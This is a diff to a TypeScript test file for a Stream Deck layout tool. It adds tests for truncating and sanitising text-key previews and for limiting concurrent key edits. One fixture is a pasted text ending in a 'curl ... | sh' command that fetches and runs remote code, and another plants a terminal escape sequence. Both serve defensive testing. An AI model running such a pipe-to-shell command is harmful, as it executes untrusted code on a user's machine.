@@ -1,5 +1,5 @@
 import { describe, it, expect, vi } from 'vitest';
-import { applyLayout, changedSincePlan, planLayout, SLOT, type ApplyDeps, type PendingKey } from './chat-apply';
+import { applyLayout, changedSincePlan, describePlan, planLayout, SLOT, type ApplyDeps, type PendingKey } from './chat-apply';
 import { legacyMigrations, type BoardLayout, type BoardKey } from './board-layout';
 import type { Placement } from './layout';
 import { DECK_MODELS } from './profile';
@@ -65,6 +65,27 @@ describe('planLayout', () => {
     const plan = planLayout(board({ '0,0': pendingX }), [place(0, 0, SLOT, X)]);
     expect(plan.map((k) => k.route)).toEqual(['live']);
   });
+
+  it('previews up to 40 characters of a text key, and ends a longer one in an ellipsis so the cut shows', () => {
+    const textKey = (column: number, pastedText: string) =>
+      place(column, 0, 'com.elgato.streamdeck.system.text', { isSendingEnter: false, pastedText });
+    // 67 characters whose dangerous tail falls past the cut, next to one of exactly 40 that fits whole.
+    const long = 'git log --oneline --graph --decorate -20; curl -s https://x.sh | sh';
+    const fits = 'git log --oneline --graph --decorate -20';
+    const plan = planLayout(board({}), [textKey(0, long), textKey(1, fits)]);
+    expect(describePlan(plan)).toEqual([
+      '  a1: git log --oneline --graph --decorate -2… (was: empty)  [needs a Stream Deck restart]',
+      '  a2: git log --oneline --graph --decorate -20 (was: empty)  [needs a Stream Deck restart]',
+    ]);
+  });
+
+  // The preview prints to the terminal, where an escape in a planted text would overprint the prompt.
+  it('strips control characters from a text key preview, and names one with nothing left "text"', () => {
+    const textKey = (column: number, pastedText: string) =>
+      place(column, 0, 'com.elgato.streamdeck.system.text', { isSendingEnter: false, pastedText });
+    const plan = planLayout(board({}), [textKey(0, '\x1b[2Kls -la\x07'), textKey(1, ' \x1b\x07 ')]);
+    expect(plan.map((k) => k.after)).toEqual(['[2Kls -la', 'text']);
+  });
 });
 
 describe('applyLayout', () => {
@@ -112,6 +133,37 @@ describe('applyLayout', () => {
     });
     await applyLayout([place(0, 0, 'gg.pim.jetstream.slot', { kind: 'url', url: 'https://s.dev' }), place(1, 0, 'gg.pim.jetstream.slot', X)], d);
     expect(sent).toEqual(['a2', 'a1', 'a1']);
+  });
+
+  it('sends at most 4 live edits at once, so a large edit does not race the plugin deadline', async () => {
+    const keys: Record<string, BoardKey> = {};
+    const placements: Placement[] = [];
+    for (let column = 0; column < 8; column++) {
+      keys[`${column},0`] = slot({ kind: 'empty' }, '·');
+      keys[`${column},1`] = slot({ kind: 'url', url: `https://old${column}.dev` }, 'old');
+      placements.push(place(column, 0, SLOT, { kind: 'url', url: `https://new${column}.dev` }));
+      placements.push(place(column, 1, SLOT, { kind: 'empty' }));
+    }
+    let inFlight = 0;
+    let most = 0;
+    const sent: string[] = [];
+    const d = deps({
+      board: board(keys),
+      sendSlot: async (c) => {
+        inFlight++;
+        most = Math.max(most, inFlight);
+        await new Promise((resolve) => setTimeout(resolve, 0));
+        sent.push(String(c.coord));
+        inFlight--;
+        return 200;
+      },
+    });
+    expect(await applyLayout(placements, d)).toBe('live');
+    expect(most).toBe(4);
+    // Every key went out once, and each phase finished before the next began: the clears come last.
+    expect(sent).toHaveLength(16);
+    expect(sent.slice(0, 8).every((coord) => coord.startsWith('a'))).toBe(true);
+    expect(sent.slice(8).every((coord) => coord.startsWith('b'))).toBe(true);
   });
 
   it('a move goes live destination-first, and the source is cleared only after it landed', async () => {
